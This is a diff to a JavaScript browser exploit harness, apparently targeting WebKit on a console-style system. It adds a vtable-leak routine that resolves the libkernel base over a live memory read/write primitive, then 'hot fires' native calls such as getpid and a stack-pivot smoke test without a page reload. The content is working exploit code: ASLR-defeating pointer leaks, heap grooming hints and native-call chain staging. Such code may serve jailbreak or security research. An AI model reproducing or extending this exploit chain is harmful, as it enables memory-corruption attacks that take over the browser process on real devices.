@@ -56,12 +56,14 @@ import {
     collectLiveVtableExtPtrs,
     resolveLibkernelFromExtList,
     formatExtPtrDiagLine,
+    persistSessionBases,
 } from "./libkernel_resolve.js";
+import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830t";
+const BUILD_ID = "rw-20250830u";
 const SS_NATIVE_MODE = "wk-native-mode";
 /** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
 function getNativeMode() {
@@ -277,15 +279,15 @@ function setUi() {
         const nm = getNativeMode();
         if (nativeStaged) {
             btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
-            btnNative.title = "prefer reload+Start for fresh heap";
+            btnNative.title = "lk hot after 2e — fire without reload";
         } else {
             btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
-            btnNative.title = "Accept lk → reload → Start auto-fires";
+            btnNative.title = "Start → 2e Leak+lk → Arm getpid (no reload)";
         }
     }
     if (btnLoadCal) {
-        btnLoadCal.disabled = busy;
-        btnLoadCal.textContent = "Calc lk";
+        btnLoadCal.disabled = busy || !ready;
+        btnLoadCal.textContent = "2e Leak+lk";
     }
     if (btnOneReadLk) {
         btnOneReadLk.disabled = busy || !ready;
@@ -670,7 +672,105 @@ function logExtPtrDiag(ptrDiag) {
     }
 }
 
-/** Collect vtable ext ptrs → vote/compare → verify — no manual paste. */
+/** lk resolved on live primitive — no reload before native fire. */
+function onLkFoundHot(lk, hit) {
+    const iatRva = hit && hit.iatRva != null ? hit.iatRva : null;
+    saveLibkernelSession(lk, iatRva, { forced: true });
+    if (addrIn) addrIn.value = String(lk);
+    const via = hit ? (hit.method + "/" + hit.via) : "?";
+    mark("LK-OK", lk + " (" + via + ") reads=0 — HOT (no reload)");
+    mark("LK-HOT", "tap Arm getpid now — primitive still live");
+    state("lk hot — Arm getpid", "ok");
+    try {
+        crashLog.append("LK-HOT " + lk + " " + via, "LK-OK");
+        crashLog.flushSync();
+    } catch (_) { }
+    renderOut();
+    setUi();
+    if (params.get("hotfire") === "1" && getNativeMode() !== "off")
+        tryHotNativeFire();
+}
+
+function tryHotNativeFire() {
+    if (!ready || !window.p || busy || !nativeAllowed) return;
+    const lk = lkFromUi();
+    if (!lk) {
+        mark("NATIVE-SKIP", "no lk for hot fire");
+        renderOut();
+        return;
+    }
+    try {
+        if (!nativePrep)
+            ensureNativePrep(window.p, loadEffectiveOff());
+    } catch (err) {
+        mark("NATIVE-SKIP", "prep: " + (err.message || String(err)));
+        renderOut();
+        return;
+    }
+    mark("LK-HOT-FIRE", "auto " + getNativeMode() + " lk=" + lk);
+    renderOut();
+    runFireGetpid();
+}
+
+/** Cal 2e lite — vtable leak + ext→lk vote; lk stays hot for getpid on same page. */
+async function runVtable2eLk() {
+    if (!ready || !window.p || busy) return false;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    let webkitBase = basesFromSession(off).webkitBase;
+    if (!webkitBase && nativePrep && nativePrep.webkitBase)
+        webkitBase = nativePrep.webkitBase;
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase — Start first");
+        state("Start first", "bad");
+        renderOut();
+        return false;
+    }
+
+    busy = true;
+    setUi();
+    mark("2E-LK", "build=" + BUILD_ID + " — cal 2e lite (hot lk, no reload)");
+    renderOut();
+
+    try {
+        const vtslots = params.get("vtslots");
+        const result = await probeLibkernelViaVtable({
+            p: p,
+            carrier: window._wkCarrier || null,
+            webkitBase: webkitBase,
+            off: off,
+            log: mark,
+            read8: read8p,
+            read4: read4p,
+            yieldFn: function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); },
+            opts: {
+                full: params.get("full") === "1",
+                vtslots: vtslots ? parseInt(vtslots, 10) : undefined,
+                retain: retained,
+            },
+        });
+
+        if (result.ok && result.lk) {
+            onLkFoundHot(result.lk, result.hit);
+            return true;
+        }
+
+        mark("LK-HINT", "groom 512 → Start → 2e again, or ?full=1");
+        state("2e lk miss", "bad");
+        renderOut();
+        return false;
+    } catch (err) {
+        mark("LK-FAIL", err.message || String(err));
+        state("2e error", "bad");
+        renderOut();
+        return false;
+    } finally {
+        busy = false;
+        setUi();
+    }
+}
+
+/** Collect vtable ext ptrs → vote/compare → verify — legacy heavy path. */
 async function runScanExtToLk() {
     if (!ready || !window.p || busy) return false;
     const p = window.p;
@@ -735,21 +835,7 @@ async function runScanExtToLk() {
             logExtPtrDiag(hit.ptrDiag);
 
         if (hit.ok && hit.lk) {
-            saveLibkernelSession(hit.lk, hit.iatRva || null);
-            if (addrIn) addrIn.value = String(hit.lk);
-            if (hit.fnRefs && hit.fnRefs.length) {
-                for (let fi = 0; fi < hit.fnRefs.length && fi < 4; fi++) {
-                    const fr = hit.fnRefs[fi];
-                    mark("LK-PTR-OK", fr.label + " fn=0x" + fr.hex + " via " + fr.key);
-                }
-            }
-            mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ")"
-                + " reads=0 distinctFn=" + (hit.distinctFn != null ? hit.distinctFn : "?"));
-            mark("LK-HINT", "Accept lk → reload → pivot smoke → Arm getpid");
-            state("libkernel auto OK (0-read)", "ok");
-            crashLog.append("LK-EXT-SCAN " + hit.lk + " " + hit.method + " r0", "LK-OK");
-            crashLog.flushSync();
-            renderOut();
+            onLkFoundHot(hit.lk, hit);
             return true;
         }
 
@@ -943,7 +1029,7 @@ function runManualTest(testId) {
             return;
         }
         if (testId === "leak-lk") {
-            runLeakLkScan().catch(function (err) {
+            runVtable2eLk().catch(function (err) {
                 mark("LK-FAIL", err.message || String(err));
                 busy = false;
                 setUi();
@@ -1039,15 +1125,15 @@ function saveBasesManual() {
             mark("SAVE-FAIL", "nativeFn capture failed");
             return;
         }
-        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
         const webkitBase = (nativeFn && off.wk_expm1_builtin)
             ? nativeFn.sub32(off.wk_expm1_builtin)
             : resolveWebkitBase(off, nativeFn);
         if (webkitBase) {
-            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
+            persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
             mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
-            mark("SAVE-HINT", "optional — Force lk → Fire getpid");
+            mark("SAVE-HINT", "cal/index_rw share session — open index_cal after this");
         } else {
+            persistSessionBases(nativeFn, null);
             mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
         }
         state("bases saved — tap gadget buttons", "ok");
@@ -1507,7 +1593,7 @@ function captureNativeChain(p, mFunctionOff, off) {
             const webkitBase = new int64(n >>> 0, Math.floor(n / 0x100000000));
             addPtr("webkitBase (assumed)", webkitBase,
                 "nativeFn - 0x" + off.wk_expm1_builtin.toString(16));
-            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
+            persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
         }
     }
     return nativeFn;
@@ -2287,7 +2373,7 @@ function calcLkFromHex() {
 }
 
 function runTryCalPtrs() {
-    runScanExtToLk();
+    runVtable2eLk().catch(reportErr);
 }
 
 function runOneReadLk() {
@@ -3370,10 +3456,7 @@ function ensureNativePrep(p, off) {
     const nativeFn = mainOrig;
     if (!nativeFn) throw new Error("nativeFn capture failed");
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-    try {
-        sessionStorage.setItem("wk-nativeFn", String(nativeFn));
-        sessionStorage.setItem("wk-webkitBase", String(webkitBase));
-    } catch (_) { }
+    persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
     const pivotObj = {};
     const pivotCell = p.leakval(pivotObj);
     nativePrep = prepNativeChain(p, off, webkitBase, {
@@ -3586,9 +3669,8 @@ async function freeBeforeNative() {
 function seedNativeSession(p, off) {
     const fn = captureNativeFnQuick(p, off);
     if (fn) {
-        try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
         const base = resolveWebkitBase(off, fn);
-        if (base) try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
+        persistSessionBases(fn, base, base ? { trust: "rw" } : undefined);
     }
     return fn;
 }
@@ -3797,12 +3879,12 @@ async function runStart() {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "paste lk from cal → Accept lk → Start → peek / Arm getpid (stay on page, no reload)");
+        mark("HINT", "Start → 2e Leak+lk → Arm getpid (same page, no reload)");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
         ensureUiVisible();
-        state("primitive OK — paste lk, Accept, peek or native", "ok");
+        state("primitive OK — 2e Leak+lk → Arm getpid", "ok");
     } catch (err) {
         state("failed: " + err.message, "bad");
         mark("ERROR", err.stack || err.message);
@@ -3963,7 +4045,7 @@ function init() {
     wireGroomBar(() => busy);
     setUi();
     renderOut();
-    state("Start → paste lk from cal, Accept lk, peek (no reload)", "");
+    state("Start → 2e Leak+lk → Arm getpid (no reload)", "");
 }
 
 function bootUi() {
